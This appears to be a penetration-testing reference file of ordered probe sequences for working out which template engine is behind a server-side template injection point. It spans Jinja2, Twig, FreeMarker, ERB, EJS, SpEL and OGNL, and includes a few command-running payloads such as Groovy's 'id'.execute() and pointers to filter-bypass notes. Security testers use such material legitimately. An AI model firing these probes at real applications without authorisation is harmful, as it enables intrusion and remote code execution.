# Detection sequences — ordered probe-scripts per ambiguity

The right probes in the right order for each "two engines could
both give 49" case. Each sequence converges in ≤4 probes.

---

## Case A: `{{7*7}}`→49 — Jinja2 vs Twig vs Nunjucks

```text
1. {{7*'7'}}   → 7777777 → Jinja2 or Nunjucks (str-mul)
               → 49/error → Twig (coerced)
2. if str-mul: {{'a'.upper()}} → 'A'=Jinja2; err/empty=Nunjucks
   (Nunjucks has |upper filter not .upper() method)
3. if Twig:    {{'a'|upper}} → 'A' confirms
   further:   {{_self}} → Template obj → Twig; Jinja has self too
              but {{'a'+'b'}}→0 in Twig clinches it
4. Nunjucks check: {{range.constructor.name}} → 'Function' → JS!
   (Python-fns don't have .constructor → jinja says undefined)
```

## Case B: `${7*7}`→49 — FreeMarker vs Velocity vs Pebble vs Jinjava vs Groovy vs JSP-EL vs Marko

```text
1. ${x!''}     → silences-undefined → FreeMarker ONLY
   (Velocity renders $x or empty without error; Pebble uses {{}}
    not ${} — wrong syntax → excludes Pebble/Jinjava)
2. FM check: ${.version} → renders version → FreeMarker confirm
3. if not FM: $x — silent-empty → Velocity (Velocity quiet-ref)
   $velocityCount → renders count? → Velocity
4. Groovy check: ${'id'.execute()} → works → Groovy
   ${new File('/x')} → File-render? → Groovy
5. JSP-EL check: ${''.class} → java.lang.Class → EL
   ${pageContext} → context-obj → JSP-EL
6. Marko check: ${x?string} → ?-ops → not marko; plain ${} eval
   in a node-app → Marko
```

## Case C: `<%=7*7%>`→49 — EJS vs ERB vs JSP-scriptlet vs ASP

```text
1. <%= 'a'.upcase %>   → 'A' → ERB (ruby method)
   <%= 'a'.toUpperCase() %> → 'A' → EJS (js method)
2. ERB confirm: <%= RUBY_VERSION %> / <%= ENV['PATH'][0..3] %>
3. EJS confirm: <%= NaN %> → 'NaN' / <%= undefined %> → 'undefined'
   / <%= typeof x %> → 'undefined'
4. JSP check: <%= request.getMethod() %> → 'GET' → JSP
   <%= System %> → class-render → JSP
5. ASP check: <%= Response %> → obj → ASP-classic
   <%= UCase('a') %> → 'A' → ASP VBScript fn
```

## Case D: `#{7*7}`→49 — Slim vs Pug vs SpEL vs OGNL

```text
1. #{RUBY_VERSION} → ruby → Slim (in the right context)
   #{x.class}      → Class-render → Slim/Pug?
2. #{process}      → works → Pug/JS-side
3. OGNL check: %{7*7} → 49 → OGNL (its sigil is %)
   #{session['x']} → struts-style → OGNL
4. SpEL check: #{T(java.lang.Math)} → class → SpEL!
   #{'x'.class}   → class-render → SpEL
```

## Case E: `{{7*7}}` literal — no-eval vs Liquid vs Handlebars vs Django

```text
1. {{x}} where x known-bound → resolves? → engine active, just
   no-arithmetic → Liquid/Handlebars/Django
2. {{7|times:7}} → 49 → Liquid!
   {{7|plus:7}}   → 14 → Liquid
3. {{lookup this 'x'}} → resolves → Handlebars
   {{this}} → context-dump → Handlebars
4. {% now 'Y' %} → renders year → Django!
   {% load %} works → Django
5. {{x.y}} walks attrs? → Handlebars/Django
   {{x|filter}} works? → Liquid/Django
6. NOTHING works → probably no SSTI — OR the render is elsewhere
   (stored/email/pdf) — check the deferred-render paths
```

## Case F: server-side vs client-side — the CTI check

```text
{{7*7}} → 49 — but WHO evaluated?
→ view-source: is "49" in the raw response bytes?
   YES → server-rendered → SSTI
   NO  → client-side template-injection — {{ }} of a JS-template —
        the browser evaluated it — CSTI is XSS-class —
        open web-xss/references/framework-sinks.md — Vue/Angular
        template injection — different exploit path
```

The source-vs-rendered check decides SSTI-vs-CSTI in one look.

## Case G: eval-works vs blind-eval — the output-channel check

```text
{{7*7}} → response contains 49? → direct channel
{{7*7}} → response MISSING your input → blind?
   → {{config}} → response grew? — then input IS evaluated but
     the render-position is elsewhere — find WHERE it renders
     (stored-view? admin? email? pdf?) — the deferred channels
{{x}} → input literally absent → maybe the input never reached
   a template → check for a render-trigger endpoint
```

## Case H: filtered-vs-safe — `{{7*7}}`→error

```text
{{7*7}} → 500 → engine parsed → SSTI confirmed — the filter list
   is between you and objects — ssti-bypass.md
{{7*7}} → "name contains illegal chars" → input-filter — before
   the engine — encode/WAF-bypass — sanitizer_fuzz
{{7*7}} → 400-silent → endpoint-validation — maybe not templated
```

## The master decision-tree

```text
{{7*7}} → 49? ──yes──→ Case A ({{}}-family)
        │        └──→ also try ${} <% %> #{} *{} — maybe multiple fire
        └─literal──→ Case E (safe-engine?) → then deferred-render check
                              → Case F (client-side?)
                              → Case G (blind position?)
                              → {0}-format check (format-string.md)
```

Every branch has a ≤4-probe sequence — total fingerprint ≤ ~10
requests worst-case.
